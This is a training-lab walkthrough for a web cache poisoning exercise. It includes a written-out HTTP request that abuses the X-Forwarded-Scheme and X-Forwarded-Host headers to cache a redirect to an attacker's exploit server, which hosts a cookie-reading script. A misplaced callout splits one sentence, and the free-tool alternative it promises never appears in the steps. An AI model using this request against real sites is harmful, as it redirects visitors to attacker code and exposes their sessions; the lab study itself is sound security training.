# Lab 08 — Web cache poisoning with multiple headers

> **Expert** · [Official lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)

**Entry point:** two unkeyed headers must be combined — neither is enough

> 🔧 **Burp Community alternative:** the tool named below is Pro-only — the free replacement is described in the steps.
alone.

## Solution

1. Param Miner reveals `X-Forwarded-Host` (reflected into the script
   import) and `X-Forwarded-Scheme` (controls the scheme).
2. `X-Forwarded-Scheme: http` alone → 302 redirect to the HTTPS version of
   the **Host**; combined with a hostile forwarded host, the redirect
   targets your server.
3. Poison with a cache buster:

```http
GET /?cachebuster=1 HTTP/1.1
X-Forwarded-Scheme: http
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

4. The cached 302 sends victims to your exploit server — host the payload
   (e.g. `alert(document.cookie)`) at `/resources/js/...`, remove the
   buster, re-poison until the victim redirects — lab solved.

## Notes

Multi-header poisoning: enumerate ALL unkeyed inputs, then look for
*interactions* between them.
